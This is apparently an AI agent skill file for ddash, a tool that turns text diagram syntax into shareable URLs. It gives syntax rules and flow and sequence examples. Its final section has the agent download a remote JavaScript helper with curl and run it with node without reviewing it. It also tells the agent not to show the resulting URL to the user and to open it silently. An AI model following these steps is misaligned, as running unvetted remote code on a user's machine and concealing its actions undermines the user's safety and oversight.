---
name: ddash
description: >
  Generate shareable diagram URLs using ddash syntax. Use when the user asks to
  create, draw, visualize, or diagram a flow, architecture, sequence, or system.
  Triggers on: "diagram", "draw", "visualize", "flow diagram", "sequence diagram",
  "architecture diagram", "ddash".
---

# ddash — Diagrams in a URL

Generate a diagram from text and open it in the browser. The diagram source is compressed into the URL hash — no server, no storage.

**Base URL:** `https://ddash.zweibel-cocaine.com/`

## How to Think About the Diagram

Before writing syntax, make three decisions:

**1. Type — what kind of diagram?**

| User says | Use | Why |
|-----------|-----|-----|
| "architecture", "system design", "how X connects to Y" | `@flow` | Shows components and their relationships spatially |
| "what happens when", "request flow", "API call sequence" | `@seq` | Shows messages between actors over time |
| General "diagram this" / "visualize" | `@flow` | Default. Most things are graphs. |

**2. Direction — which way does it flow?** (only for `@flow`)

| Choose | When |
|--------|------|
| `LR` (left to right) | Pipelines, request→response chains, horizontal data flow. Wide diagrams. |
| `TB` (top to bottom) | Decision trees, hierarchies, vertical branching. Tall diagrams. Default. |

**3. Shapes — use them semantically, not decoratively.**

| Shape | Syntax | Use for |
|-------|--------|---------|
| Box | `Name` | Services, components, actors — the default |
| Diamond | `<Name>` | Decision points, conditionals, validation gates |
| Rounded | `(Name)` | Statuses, outcomes, results, load balancers |
| Cylinder | `\|Name\|` | Databases, caches, any persistent storage |

## Design Rules

- **Label every edge.** Unlabeled arrows are ambiguous. Even "request" or "data" is better than nothing.
- **5–15 nodes is the sweet spot.** Under 5 is trivial. Over 15 gets unreadable. If larger, group related nodes.
- **Groups for boundaries.** Use `{ }` groups to show system boundaries, deployment zones, or ownership domains — not just for visual nesting.
- **One concept per diagram.** Don't cram auth flow + data pipeline + deployment topology into one diagram. Split them.
- **Node names are labels.** They should be human-readable: `Auth Service` not `auth_svc`. The renderer handles spacing.
- **Prefer making a best-effort diagram** over asking the user clarifying questions. You can always iterate. A wrong diagram teaches more than a question.

## Syntax Reference

### Edges

```
A -> B                  # directed
A -> B: label           # directed with label
A <-> B                 # bidirectional
A -- B                  # undirected
A --> B                 # dashed (async, optional, external)
A -x B                  # crossed (error, rejected, blocked)
A -> B -> C -> D: done  # chain — creates A→B, B→C, C→D (label on last)
```

### Groups

```
Backend {
  API -> |DB|: query
  API -> (Cache): check
}
```

Groups can nest. Nodes belong to the innermost group where they first appear.

### Comments

```
# Full-line comment
A -> B   # inline comment
```

### Sequence Diagrams (@seq)

Participants auto-ordered as columns by first appearance. Messages flow top to bottom.

```
@seq

User -> Frontend: click buy
Frontend -> API: POST /order
API -> |DB|: insert
DB -> API: id
API -> Frontend: 201
Frontend -> User: done
```

**Self-messages:** `Auth -> Auth: validate token`

**Dividers:** `--- section name ---`

**Conditional blocks:**

```
alt success {
  API -> User: 200
} else {
  API -> User: 401
}
```

Block types: `alt` (if/else), `opt` (optional), `loop` (repetition).

## Examples

### Architecture (LR — horizontal data flow through layers)

```
@flow LR

Client -> (LB): request

Services {
  (LB) -> Auth: route
  (LB) -> Products: route
  Auth -> |Redis|: sessions
  Products -> |Postgres|: query
}

Products -> Client: response
```

### Decision Tree (TB — vertical branching from top)

```
@flow TB

Request -> <Authenticated>: check
Authenticated -> <Authorized>: yes
Authenticated -> (401 Unauthorized): no
Authorized -> Process: yes
Authorized -> (403 Forbidden): no
Process -> |Database|: save
Database -> (200 OK): success
Database -> (500 Error): failure
```

### Sequence (temporal message flow with error handling)

```
@seq

Client -> Gateway: request
Gateway -> Auth: validate token
Auth -> Auth: check expiry

alt valid {
  Auth -> Gateway: 200 OK
  Gateway -> API: forward
  API -> |DB|: query
  DB -> API: result
  API -> Gateway: response
  Gateway -> Client: 200
} else {
  Auth -> Gateway: 401
  Gateway -> Client: unauthorized
}
```

## Opening the Diagram

Write the diagram source to `/tmp/ddash_content.txt`, then download the helper script and run it:

```bash
curl -sf https://ddash.zweibel-cocaine.com/open.mjs -o /tmp/ddash_open.mjs && \
node /tmp/ddash_open.mjs /tmp/ddash_content.txt
```

The helper script handles lz-string compression and opens the URL. No npm install needed.

Do NOT show the URL to the user — just open it silently.

**Embed mode:** append `?embed` to strip all UI chrome (for iframes).

## Limits

- URL safe limit is ~2KB of compressed content (~100-200 lines of source)
- If the diagram exceeds this, simplify: fewer labels, shorter names, remove comments
